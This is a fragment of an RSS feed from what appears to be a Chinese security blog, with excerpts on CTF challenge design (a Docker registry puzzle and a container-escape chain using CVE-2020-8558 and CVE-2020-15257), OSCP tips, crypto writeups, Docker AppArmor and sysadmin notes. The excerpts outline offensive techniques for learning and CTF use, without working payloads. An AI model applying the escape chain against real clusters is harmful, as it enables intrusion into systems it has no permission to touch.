      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/%E5%87%BA%E9%A2%98/hwctf202101/%E5%87%BA%E9%A2%98%E6%8A%A5%E5%91%8A-containerregistry_misc.html</link>
      <pubDate>Mon, 25 Jan 2021 02:36:55 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/%E5%87%BA%E9%A2%98/hwctf202101/%E5%87%BA%E9%A2%98%E6%8A%A5%E5%91%8A-containerregistry_misc.html</guid>
      <description>出题报告: container/registry_misc hwctf202001/container/registry_misc
题目描述 请获取该镜像仓库中的flag.txt docker pull swr.cn-south-1.myhuaweicloud.com/huaweictf/registry_misc:v2
 难度: 2/5 预计解题时间: 3h  出题目的  引导选手发现并学习registry v2 api 引导选手理解业界镜像仓库的实现原理  writeup 直接执行docker pull发现无法下载镜像
st0n3@yoga:~$ docker pull swr.cn-south-1.myhuaweicloud.com/huaweictf/registry_misc:v2 Error response from daemon: mediaType in manifest should be &#39;application/vnd.docker.distribution.manifest.v2+json&#39; not &#39;&#39; 根据题目描述、报错信息，经过搜索引擎搜索一段时间后，可以发现该镜像的格式不正确，所以docker daemon无法识别。
根据docker registry v2的官方文档(https://docs.docker.com/registry/spec/api/), 可以发现registry v2的api, 根据这些api应该可以下载文件内容
经过一段时间的学习，可以发现manifest是描述一个镜像的关键文件
GET /v2/&amp;lt;name&amp;gt;/manifests/&amp;lt;reference&amp;gt; Host: &amp;lt;registry host&amp;gt; Authorization: &amp;lt;scheme&amp;gt; &amp;lt;token&amp;gt; 查看该镜像的manifest如下
╭─st0n3@yoga in ~ ╰$ curl -s -k -H &amp;quot;Authorization: Bearer x&amp;quot; -H &amp;quot;Accept: application/vnd.</description>
    </item>
    
    <item>
      <title>出题报告: nday_container_escape</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/%E5%87%BA%E9%A2%98/xctf_huaweicloud-qualifer-2020/%E5%87%BA%E9%A2%98%E6%8A%A5%E5%91%8A-nday_container_escape.html</link>
      <pubDate>Wed, 20 Jan 2021 03:02:04 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/%E5%87%BA%E9%A2%98/xctf_huaweicloud-qualifer-2020/%E5%87%BA%E9%A2%98%E6%8A%A5%E5%91%8A-nday_container_escape.html</guid>
      <description>tags: 出题报告,container 出题报告: nday_container_escape xctf-hwc_qualifier_2020/container/nday_container_escape
2020年XCTF华为云专题赛线上赛中，出了一个容器相关的题目，记录一下。
这类题目在国内比赛中还算少见（似乎是首次？），遗憾的是比赛结束时该题仍是0解，可能跟当天赛程非常紧凑有关。
1. 背景 在筹备比赛题目的时间里，有一个新爆出的漏洞CVE-2020-15257比较火。漏洞出现在docker的关键组件containerd中，当一个容器拥有host网络命名空间时，可以导致容器逃逸。这首次揭示了network namespace的安全风险，具有一定的借鉴意义。
但是，这个漏洞从实践层面上看又有一点鸡肋：
 host网络通常较少在实际场景中出现（因为端口转发通常已足够使用） host网络在CIS docker基线中是一个禁止项，因此成熟的生产环境中，几乎不会出现该场景 即使使用了host网络的容器，不一定公网可访问，不一定存在命令执行漏洞  为此漏洞的利用场景受限感到惋惜的同时，我希望能构建一个更常用的环境，放大其利用场景。
CVE-2020-8558就是一个绝佳的放大器(不起眼，实战中不一定修复)，该漏洞是由于kube-proxy默认设置了route_localnet，允许邻近主机绕过localhost边界。
因此我们可能从一个非host网络容器逃逸！
2. 环境搭建 根据上述分析，我们很容易可以构造这样一个贴近实战的漏洞利用链：CVE-2020-8558&amp;mdash;&amp;gt;k8s 10250&amp;mdash;&amp;gt;CVE-2020-15257
其环境大致如下：
我将上述环境搭建在了qemu里，选手可以ssh进入qemu中的容器内，发现漏洞并逃逸至qemu。
上述qemu被封装在了一个docker镜像中（所以实际环境是一个docker in qemu in docker的环境），可以使用以下配置启动环境
version: &#39;3&#39; services: challenge: image: swr.cn-north-1.myhuaweicloud.com/huaweictf/ctf_nday_docker_escape:v0.1 ports: - &amp;quot;2222:22&amp;quot; 3. writeup 3.1 信息收集 以ctf/ctf进入环境，我们大致会看到这样一些信息，此时我们位于一个容器内，该容器由k8s启动的
st0n3@yoga:~$ ./ctf.expect spawn ssh -o StrictHostKeyChecking=no ctf@1.2.3.4 ctf@1.2.3.4&#39;s password: Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-47-generic x86_64) ... ++ sudo KUBECONFIG=/etc/kubernetes/admin.conf kubectl get pods --selector=app=ubuntu --template &#39;{{range .</description>
    </item>
    
    <item>
      <title>开源软件安全研究方法</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%96%B9%E6%B3%95.html</link>
      <pubDate>Mon, 04 Jan 2021 03:46:56 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E6%BA%90%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E6%96%B9%E6%B3%95.html</guid>
      <description>tags: 方法论 开源软件安全研究方法 0. 背景 过去很长一段时间，我的主要精力都花在容器安全上。容器是一个很大的概念，涉及领域众多，如果缺少一套高屋建瓴的、可行的方法论，将会被困在局部的知识点上，而无法系统性得分析出关键的容器安全风险。下面是基于前期容器安全研究总结了一套通用方法论，其中每个叶子节点都可以写成一篇文章，用于承载相关知识点的具体内容，如果一个节点的所有子节点都形成了翔实的文档，则可以认为完成了这个节点的研究工作。
注：本文仅列举了需要做哪些工作，并未指出具体应怎么做
1. 研究方法 1.1 研究目标/范围 2.2 研究方法 2. 目标软件基础信息收集 磨刀不误砍柴工，首先能熟练使用该软件的主要功能，才有可能在其中发现有建设性的安全风险。
2.1 软件简介 2.2 安装 2.3 快速使用 2.4 软件主要功能介绍 2.5 其他关于该软件的重要介绍 3. 开源情况 3.1 开源基本情况  开发语言 LICENSE branch, tag 项目主要贡献者 项目上下游情况  3.2 issue,commit管理概况 issues和commits记录了开发的详细过程，这中间可能包括了一些隐蔽的问题，包括：未显性以漏洞形式发布但由团队自行发现修复、直接以版本特性更新解决了漏洞、甚至开发团队无感知地解决了问题。
对于一些关键文件的commits记录，则需要重点关注。
3.3 roadmap分析 roadmap中包含了项目未来的变化，如果能提前获悉软件未来的发展方向，则能在代码开发之前就布局相关技术的研究。
3.4 已知漏洞数量与分布情况 分析已知漏洞数量与分布情况有助于快速识别，历史上安全研究人员的关注点，进而有助于自己分析未来的研究方向。
3.5 如何报告该项目的漏洞 4. 如何第一时间知悉该软件安全情报 google announce, 例如：
 https://groups.google.com/forum/feed/kubernetes-announce/msgs/rss_v2_0.xml?num=50 https://groups.google.com/forum/feed/golang-announce/msgs/rss_v2_0.xml?num=50  5. 历史漏洞分析与复现  有规范的、成体系的分析、复现并存留实验环境，可以利用vagrant或docker记录、分享漏洞环境。 不只是复现漏洞，更重要的是复现漏洞挖掘的方法或过程（能应用于同类漏洞挖掘）  6. 安全关键技术 软件安全性所依赖的关键技术
7. 软件使用(配置)安全 8.</description>
    </item>
    
    <item>
      <title>oscp tips</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E4%BA%BA%E6%89%8D%E7%AB%9E%E4%BA%89%E5%8A%9B/%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E8%AE%A4%E8%AF%81/oscp/oscp%E8%80%83%E8%AF%95%E6%94%BB%E7%95%A5/oscp-tips.html</link>
      <pubDate>Wed, 30 Dec 2020 11:48:56 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E4%BA%BA%E6%89%8D%E7%AB%9E%E4%BA%89%E5%8A%9B/%E5%AE%89%E5%85%A8%E8%81%8C%E4%B8%9A%E8%AE%A4%E8%AF%81/oscp/oscp%E8%80%83%E8%AF%95%E6%94%BB%E7%95%A5/oscp-tips.html</guid>
      <description>oscp tips 许久前通过了oscp考试，一直想记录一下的。但是优先级排在了升级博客后面，最近弄完了才有空写一下。
TL;DR  开局全端口扫描 识别兔子洞 随手截图真的很重要  每个local.txt和proof.txt都需要有截图才记分   证书仅体现是否通过，如果有把握通过，可以不用全部搞定，留点时间检查一下截图是否齐全 这只是考试  如果平时工作与渗透很相关了，这个考试应该很简单，但需要转变一下思路，不要用做真实渗透的思路去应对这场考试    整体上而言，如果学员希望入门安全，oscp还是很超值的，教材囊括广泛、表述翔实简单，推荐在校学生报名。
如果学员已经在工作中大量接触渗透测试了，则不太划算（除非公司报销）。因为oscp的实验和考试已经有点落后现实了。可能唯一有帮助的就是可以横向扩展知识面，但其实我们不必什么都学的。
一、考试 1. 识别兔子洞 考试的时候很多题都有一个奇奇怪怪的web服务，上面甚至可能托管了一些源代码，但是研究一段时间后，发现基本上都没啥用。
还有一些机器开了21,135,139,445之类的，也有很大概率仅仅是用来给学员上传文件用的，对攻击没有帮助。
因此可以留个心眼，扫到这些端口先晾着，优先关注一些奇奇怪怪的端口。一些不常见的端口，大概率是有猫腻的。
我列了一个表格，对于梳理自己的思路很有帮助
   port process interesting comment     21 ftp anonymous support seems upload tools   80 http xxxx local privilege escalation   135 msrpc  seems upload tools   139 smb  seems upload tools   445 smb  seems upload tools   xxxx xxxx xxxx RCE   xxxx      xxxx      8090 http  seems rabbit hole    2.</description>
    </item>
    
    <item>
      <title>容器安全研究的三重境界</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E5%85%A8%E6%99%AF/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E7%9A%84%E4%B8%89%E9%87%8D%E5%A2%83%E7%95%8C.html</link>
      <pubDate>Tue, 29 Dec 2020 11:07:11 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E5%85%A8%E6%99%AF/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E7%9A%84%E4%B8%89%E9%87%8D%E5%A2%83%E7%95%8C.html</guid>
      <description>tags: container,方法论 容器安全研究的三重境界 与其他形态的技术相比，容器安全的漏洞更聚集在设计层面，而非实现层面，准确得说，非编码层面。
编码层面的漏洞更容易发现，且更容易自动化发现，但这种“优势”不会一直存在。因此，必然将形成漏洞越来越难挖的局面。而对容器技术而言，这个时间点来得相当早。这使得深入容器安全显得不那么容易，使研究者沮丧，但这也会极大地锻炼安全研究者的思维能力。
一、四级安全性 如果我们作以下定义：
 将理想状态的安全定义为“理想模型” 将实际设计的结果定义为“设计模型” 将真实实现的代码定义为“实现模型”  我们将会得到4个不同级别的安全性： $$ \begin{equation} \left\lbrace \begin{array}{lr} 理想模型 \newline 设计模型 \newline 实现模型 \newline 编码漏洞 \end{array} \right. \end{equation} $$
以及3个可供挖掘漏洞的空间：
1. 编码漏洞 该类问题通常与语言本身强相关，较为显著的包括C语言带来的内存安全类问题、PHP弱类型引发的问题等。各语言都有一些不同的、隐蔽的特性，如果开发者不能熟知这些特性，则可能会埋藏漏洞。
这类问题的发现手段多，包括Fuzz,代码审计等。呈现出的漏洞数量也相当可观。
2. 三种模型间的差距  分别分析出设计模型和实现模型，将二者对比，即可得出实现层面的漏洞 将设计模型与理想模型对比，则可得出设计层面的漏洞  二、三重境界 1. 设计漏洞 寻找设计层面的漏洞，我们需要回答两个问题
 什么是容器的理想模型？ 某容器相关的项目，当前的设计模型是什么样的  对于容器来说，问题2是容易回答的，oci有翔实的specification。
难点在于解答问题一，或者我们是否有已知的安全设计模式可以套上去？
我暂时没有发现有可以直接使用的方法论，也许我们可以自行总结一套。这方面，后续我可以尝试用很长一个篇幅解答。
2. 实现漏洞 我们将追求放低至发现实现层面的漏洞，需要做的事情就简单多了
 熟读oci specification 走读容器相关项目的代码  看，简单多了——至少是可执行的！
3. 编码漏洞 开篇即谈到了，容器安全的漏洞更聚集于非编码层面。但这个论述的对象主要是针对容器相关产品自身而言的，但如果将范围扩大至容器生态链呢？
例如
 docker所调用的各组件，甚至各LSM模块 由各云厂商以开源形式贡献至k8s的CNI &amp;hellip;  这样看，我们还是有希望在此层面挖掘相关漏洞的，但可能需要将挖掘范围扩大、将漏洞挖掘的方法进行微调，以适应于发现容器类漏洞。</description>
    </item>
    
    <item>
      <title>一个好用的乘法逆元扩展结论</title>
      <link>/post/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%94%A8%E7%9A%84%E4%B9%98%E6%B3%95%E9%80%86%E5%85%83%E6%89%A9%E5%B1%95%E7%BB%93%E8%AE%BA.html</link>
      <pubDate>Wed, 28 Oct 2020 04:08:34 +0000</pubDate>
      
      <guid>/post/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%94%A8%E7%9A%84%E4%B9%98%E6%B3%95%E9%80%86%E5%85%83%E6%89%A9%E5%B1%95%E7%BB%93%E8%AE%BA.html</guid>
      <description>tags: ctf,writeup,crypto 一个好用的乘法逆元扩展结论 比赛中遇到的一个好用的定理，不知道有没有名字，记录一下
$$ \begin{align} &amp;amp; p^{-1} \cdot p \equiv 1 \mod q \newline &amp;amp; q^{-1} \cdot q \equiv 1 \mod p \newline &amp;amp; \Longleftrightarrow \newline &amp;amp; p^{-1}\cdot p+q^{-1}\cdot q \equiv 1 \mod p\cdot q \end{align} $$
1. 证明 (1) $$ \begin{align} &amp;amp; 1 \equiv p^{-1} \cdot p \mod q \
&amp;amp; 1 \equiv q^{-1} \cdot q \mod p \end{align} $$
由中国剩余定理： $$ \begin{align} 1 &amp;amp; = \sum^{k}_{i=1}a_ic_i \mod p\cdot q \newline &amp;amp; =1\cdot q\cdot q^{-1} + 1\cdot p\cdot p^{-1} \mod p\cdot q \newline &amp;amp; =q\cdot q^{-1} + p\cdot p^{-1} \mod p\cdot q \end{align} $$</description>
    </item>
    
    <item>
      <title>为什么需要技能树</title>
      <link>/post/%E5%BC%80%E5%8F%91/myproject/%E6%8A%80%E8%83%BD%E6%A0%91/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E6%8A%80%E8%83%BD%E6%A0%91.html</link>
      <pubDate>Wed, 14 Oct 2020 10:06:13 +0000</pubDate>
      
      <guid>/post/%E5%BC%80%E5%8F%91/myproject/%E6%8A%80%E8%83%BD%E6%A0%91/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E6%8A%80%E8%83%BD%E6%A0%91.html</guid>
      <description> 结构化：数据结构化 系统性：知识系统性 可视化：成长可视化  </description>
    </item>
    
    <item>
      <title>强网杯-Qualifier-2020/强网先锋/baby_crt writeup</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/crypto/%E6%95%B0%E8%AE%BA/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2020%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8Bbaby_crt-writeup.html</link>
      <pubDate>Fri, 28 Aug 2020 05:53:00 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/crypto/%E6%95%B0%E8%AE%BA/%E5%BC%BA%E7%BD%91%E6%9D%AF-Qualifier-2020%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8Bbaby_crt-writeup.html</guid>
      <description>强网杯-Qualifier-2020/强网先锋/baby_crt writeup 描述信息  分值：105 已解答：77 第一名：WM 第二名：激流勇进队 第三名：L3H_Sec  附件下载
题目分析 题目提供了两个文件
 task.py: 提供了具体的加密算法，但生成flag的大素数p未知 output0: 三个数，分别对应task.py中的n,m,sig  task.py文件内容不长，可以快速翻译为数学语言如下：
典型RSA相关的参数： $$ \begin{align} \begin{cases} &amp;amp; e = 65537 \newline &amp;amp; p,q未知, n = p\cdot q \newline &amp;amp; e\cdot d \equiv 1\mod n \end{cases} \end{align} $$
基于d派生的相关参数: $$ \begin{cases} \begin{align} &amp;amp; t_1, t_2是16 bit的素数 \newline &amp;amp; gcd(d,t_{1,2}-1)==1 \newline &amp;amp; t_{1,2} \equiv 3 \mod 4 \newline &amp;amp; e_{t_1} \cdot d \equiv 1 \equiv \mod t_1 \newline &amp;amp; e_{t_2} \cdot d \equiv 1 \equiv \mod t_2 \end{align} \end{cases} $$</description>
    </item>
    
    <item>
      <title>漏洞分析与复现模板</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%E6%A8%A1%E6%9D%BF.html</link>
      <pubDate>Mon, 20 Jul 2020 02:00:00 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%E6%A8%A1%E6%9D%BF.html</guid>
      <description>tags: 漏洞分析 漏洞分析与复现模板 在开源软件安全研究方法一文中，我们提到, 漏洞复现工作需要有规范的、成体系的进行。
  有规范的、成体系的分析、复现并存留实验环境，可以利用vagrant或docker记录、分享漏洞环境。 不只是复现漏洞，更重要的是复现漏洞挖掘的方法或过程（能应用于同类漏洞挖掘）   本文将具体提出一个漏洞分析与复现过程中，要做的事情的模板。与前文同样，本文仅列举需要做哪些工作，并未指出具体应怎么做。在我历史及未来关于历史漏洞分析与复现的文章中，可以看到关于本文实际应用的实例。
一、基本信息    Item Details Note     Project spring-cloud/spring-cloud-config    Publish Date 2019-04-16    Confirm Link     CVE-ID CVE-2019-3799 mitre, cvedetails   EDB-ID EDB-46772    Exploits exp1
exp2    Affect Version 2.1.0-2.1.1, 2.0.0-2.0.3, 1.4.0-1.4.5 及更旧版本    Fix Version 2.1.2, 2.</description>
    </item>
    
    <item>
      <title>docker中apparmor的加载过程</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E5%AE%89%E5%85%A8%E7%9A%84%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/linux%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/LSM/apparmor/docker%E4%B8%ADapparmor%E7%9A%84%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B.html</link>
      <pubDate>Wed, 01 Jul 2020 09:49:00 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E8%BF%9B%E7%A8%8B%E5%AE%B9%E5%99%A8/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/docker/docker%E5%AE%89%E5%85%A8%E7%9A%84%E5%85%B3%E9%94%AE%E6%8A%80%E6%9C%AF/linux%E5%86%85%E6%A0%B8%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/LSM/apparmor/docker%E4%B8%ADapparmor%E7%9A%84%E5%8A%A0%E8%BD%BD%E8%BF%87%E7%A8%8B.html</guid>
      <description>docker中apparmor的加载过程 daemon 判断操作系统是否启用apparmor，如果支持就安装名为docker-default的规则。 https://github.com/moby/moby/blob/master/daemon/apparmor_default.go
const ( unconfinedAppArmorProfile = &amp;quot;unconfined&amp;quot; defaultAppArmorProfile = &amp;quot;docker-default&amp;quot; ) func ensureDefaultAppArmorProfile() error { if apparmor.IsEnabled() { loaded, err := aaprofile.IsLoaded(defaultAppArmorProfile) if err != nil { return fmt.Errorf(&amp;quot;Could not check if %s AppArmor profile was loaded: %s&amp;quot;, defaultAppArmorProfile, err) } // Nothing to do. if loaded { return nil } // Load the profile. if err := aaprofile.InstallDefault(defaultAppArmorProfile); err != nil { return fmt.Errorf(&amp;quot;AppArmor enabled on system but the %s profile could not be loaded: %s&amp;quot;, defaultAppArmorProfile, err) } } return nil } 其中判断是否启用apparmor代码如下，主要是判断apparmor相关文件是否存在。</description>
    </item>
    
    <item>
      <title>方舟生存进化: docker一键部署</title>
      <link>/post/%E6%B8%B8%E6%88%8F/%E6%96%B9%E8%88%9F%E7%94%9F%E5%AD%98%E8%BF%9B%E5%8C%96-docker%E4%B8%80%E9%94%AE%E9%83%A8%E7%BD%B2.html</link>
      <pubDate>Fri, 26 Jun 2020 14:00:00 +0000</pubDate>
      
      <guid>/post/%E6%B8%B8%E6%88%8F/%E6%96%B9%E8%88%9F%E7%94%9F%E5%AD%98%E8%BF%9B%E5%8C%96-docker%E4%B8%80%E9%94%AE%E9%83%A8%E7%BD%B2.html</guid>
      <description>方舟生存进化: docker一键部署 前段时间epic白给了方舟，俺也在方舟度过了153个小时的时间了，简单分享下部署方舟服务器的过程。
1. quick-start 创建docker-compose.yml文件, 执行docker-compose up -d拉起容器
version: &#39;3&#39; services: ark: container_name: ark image: thmhoag/arkserver volumes: - steam:/home/steam/Steam - ark:/ark ports: - &amp;quot;27015:27015&amp;quot; - &amp;quot;27015:27015/udp&amp;quot; - &amp;quot;7777:7777&amp;quot; - &amp;quot;7777:7777/udp&amp;quot; - &amp;quot;7778:7778&amp;quot; - &amp;quot;7778:7778/udp&amp;quot; - &amp;quot;7779:7779&amp;quot; - &amp;quot;7779:7779/udp&amp;quot; - &amp;quot;32330:32330&amp;quot; environment: - am_ark_SessionName=my_ark - am_ark_GameModIds=889745138,751991809,1404697612 - am_ark_ServerPVE=True restart: always volumes: steam: name: steam ark: name: ark 在steam里添加游戏服务器，就可以愉快得开始啦。
steam-&amp;gt;查看-&amp;gt;服务器-&amp;gt;收藏夹-&amp;gt;添加服务器-&amp;gt;输入服务器ip:27015-&amp;gt;将此地址添加至收藏夹
2. 解释 这个部署方案源于两个开源项目:
 https://github.com/FezVrasta/ark-server-tools https://github.com/thmhoag/arkserver  前者实现了arkmanager工具，后者实现了容器化部署。
docker-compose.yml文件中，配置了多个端口，其中27015是steam与服务器交互的端口，7777-7779(可自定义)是自定义的服务器端口，32330(可选)是服务器命令行管理工具RCON的连接端口。
可以通过指定环境变量来将服务器配置传递给arkmanager，可以配置的参数参考 https://github.com/FezVrasta/ark-server-tools#configuration-files/</description>
    </item>
    
    <item>
      <title>letsencrypt通过dns获取证书</title>
      <link>/post/IT%E6%9D%82%E8%B4%A7%E9%93%BA/letsencrypt%E9%80%9A%E8%BF%87dns%E8%8E%B7%E5%8F%96%E8%AF%81%E4%B9%A6.html</link>
      <pubDate>Mon, 11 May 2020 07:36:00 +0000</pubDate>
      
      <guid>/post/IT%E6%9D%82%E8%B4%A7%E9%93%BA/letsencrypt%E9%80%9A%E8%BF%87dns%E8%8E%B7%E5%8F%96%E8%AF%81%E4%B9%A6.html</guid>
      <description>letsencrypt通过dns获取证书 sudo certbot certonly --manual --preferred-challenges dns Saving debug log to /var/log/letsencrypt/letsencrypt.log Plugins selected: Authenticator manual, Installer None Please enter in your domain name(s) (comma and/or space separated) (Enter &#39;c&#39; to cancel): hackerbot.st0n3.xyz Cert is due for renewal, auto-renewing... Renewing an existing certificate Performing the following challenges: dns-01 challenge for hackerbot.st0n3.xyz - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - NOTE: The IP of this machine will be publicly logged as having requested this certificate.</description>
    </item>
    
    <item>
      <title>docker-compose使用host网络</title>
      <link>/post/IT%E6%9D%82%E8%B4%A7%E9%93%BA/docker-compose%E4%BD%BF%E7%94%A8host%E7%BD%91%E7%BB%9C.html</link>
      <pubDate>Mon, 11 May 2020 06:25:00 +0000</pubDate>
      
      <guid>/post/IT%E6%9D%82%E8%B4%A7%E9%93%BA/docker-compose%E4%BD%BF%E7%94%A8host%E7%BD%91%E7%BB%9C.html</guid>
      <description>docker-compose使用host网络 根据官方文档, 如果使用stack命令部署，可以使用networks参数配置，如果直接使用docker-compose, 使用network_mode参数配置。
 Use the host’s networking stack, or no networking. Equivalent to docker run &amp;ndash;net=host or docker run &amp;ndash;net=none. Only used if you use docker stack commands. If you use the docker-compose command, use network_mode instead. &amp;mdash;-compose file reference: https://docs.docker.com/compose/compose-file/#devices
 stack version: &amp;quot;3.8&amp;quot; services: web: networks: hostnet: {} networks: hostnet: external: true name: host docker-compose services: web: network_mode: &amp;quot;host&amp;quot; 问题 如果在docker-compose中使用networks参数配置系统默认网卡，会报以下错误：
Creating zerotier-one ... error ERROR: for zerotier-one network-scoped alias is supported only for containers in user defined networks ERROR: for one network-scoped alias is supported only for containers in user defined networks ERROR: Encountered errors while bringing up the project.</description>
    </item>
    
    <item>
      <title>vscode terminal字符间距过宽</title>
      <link>/post/IT%E6%9D%82%E8%B4%A7%E9%93%BA/vscode-terminal%E5%AD%97%E7%AC%A6%E9%97%B4%E8%B7%9D%E8%BF%87%E5%AE%BD.html</link>
      <pubDate>Fri, 08 May 2020 15:42:00 +0000</pubDate>
      
      <guid>/post/IT%E6%9D%82%E8%B4%A7%E9%93%BA/vscode-terminal%E5%AD%97%E7%AC%A6%E9%97%B4%E8%B7%9D%E8%BF%87%E5%AE%BD.html</guid>
      <description>vscode terminal字符间距过宽 kali linux 2020.1b, vscode terminal 1.44.2 的字符间距过宽。
修改&amp;quot;terminal.integrated.fontFamily&amp;quot;可以设置字体，但是我尝试了很多种字体都无效，仅发现修改为&amp;quot;Hack&amp;quot;字体有效。
坐等社区解决</description>
    </item>
    
    <item>
      <title>kali linux常用配置</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/kali/kali-linux%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE.html</link>
      <pubDate>Fri, 10 Apr 2020 12:30:00 +0000</pubDate>
      
      <guid>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/kali/kali-linux%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE.html</guid>
      <description>tags: kali kali linux常用配置 持续更新
适用kali linux 2020.1b amd64
1. qterminal使用login shell kali linux 2020.1b amd64将默认的terminal切换成了qterminal，使用qterminal默认打开的bash的non-login bash，不会自动加载profile。
可以配置一下快捷键：菜单-&amp;gt;设置-&amp;gt;键盘-&amp;gt;应用程序快捷键
配置CTRL+ALT+T启动命令为qterminal -e &amp;quot;bash --login&amp;quot;, 即可默认加载profile。
2. 替换qterminal为gnome-terminal qterminal并不是一个好方案，例如它的历史记录很短， 而gnome-terminal可以无限往上翻
apt-get update gnome-terminal 同时修改一下首选应用程序中的terminal为gnome-terminal， 这个修改会使x-terminal-emulator命令默认打开gnome-terminal
菜单-&amp;gt;设置-&amp;gt;首选应用程序-&amp;gt;实用程序-&amp;gt;终端模拟器-&amp;gt;GNOME终端-&amp;gt;注销重新登录生效
3. debian系操作系统ssh开机启动 systemctl enable ssh
4. 更改桌面文件夹为英文 cp ~/.config/user-dirs.dirs ~/.config/user-dirs.dirs.bak sed -i &amp;quot;s/桌面/Desktop/g&amp;quot; ~/.config/user-dirs.dirs sed -i &amp;quot;s/下载/Downloads/g&amp;quot; ~/.config/user-dirs.dirs sed -i &amp;quot;s/模板/Templates/g&amp;quot; ~/.config/user-dirs.dirs sed -i &amp;quot;s/公共/Public/g&amp;quot; ~/.config/user-dirs.dirs sed -i &amp;quot;s/文档/Documents/g&amp;quot; ~/.config/user-dirs.dirs sed -i &amp;quot;s/音乐/Music/g&amp;quot; ~/.config/user-dirs.dirs sed -i &amp;quot;s/图片/Pictures/g&amp;quot; ~/.</description>
    </item>
    
    <item>
      <title>VolgaCTF2020Qualifier Crypto Guess writeup</title>
      <link>/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/CTF/crypto/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/ElGamal/VolgaCTF2020Qualifier-Crypto-Guess-writeup.html</link>
      <pubDate>Wed, 01 Apr 2020 05:53:00 +0000</pubDate>
      
